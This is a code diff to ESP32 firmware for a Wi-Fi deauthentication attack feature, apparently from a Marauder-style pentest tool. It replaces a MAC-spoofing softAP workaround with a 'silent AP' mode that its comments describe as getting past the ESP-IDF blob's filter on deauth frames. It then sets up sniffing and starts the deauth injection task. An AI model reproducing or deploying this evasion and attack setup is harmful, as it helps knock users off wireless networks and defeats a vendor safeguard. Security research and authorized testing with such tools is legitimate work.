@@ -215,20 +215,13 @@ void feat_wifi_deauth(void)
         if (!pmf_warning()) return;
     }
 
-    /* Stock ESP-IDF blob rejects MGMT frames (type=0) on WIFI_IF_STA with
-     * INVALID_ARG even when addr2 matches the STA MAC — STAs aren't
-     * supposed to originate unsolicited mgmt frames. Workaround: WIFI_AP_STA
-     * mode with a softAP whose MAC is spoofed to the target BSSID, then
-     * TX via WIFI_IF_AP which has relaxed sanity checks. */
-    esp_err_t mac_rc = wifi_ap_spoof_begin(s_target);
-    Serial.printf("[deauth] ap_spoof_begin %02X:%02X:%02X:%02X:%02X:%02X rc=%d\n",
-                  s_target[0], s_target[1], s_target[2],
-                  s_target[3], s_target[4], s_target[5], (int)mac_rc);
+    /* Marauder-style silent AP mode — only setup that bypasses the blob's
+     * deauth-subtype filter on stock ESP-IDF. */
+    esp_err_t ap_rc = wifi_silent_ap_begin(s_channel);
+    Serial.printf("[deauth] silent_ap ch=%u rc=%d\n", s_channel, (int)ap_rc);
 
-    /* Start promiscuous sniffer + inject. */
-    esp_wifi_set_promiscuous(true);
+    /* Sniffer callback already layered on top of the AP+promisc mode. */
     esp_wifi_set_promiscuous_rx_cb(sniff_cb);
-    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
 
     s_running = true;
     xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
@@ -293,7 +286,5 @@ void feat_wifi_deauth(void)
 
     s_running = false;
     delay(150);
-    esp_wifi_set_promiscuous(false);
-    /* Tear down AP_STA spoof — return to plain STA mode. */
-    wifi_ap_spoof_end();
+    wifi_silent_ap_end();
 }
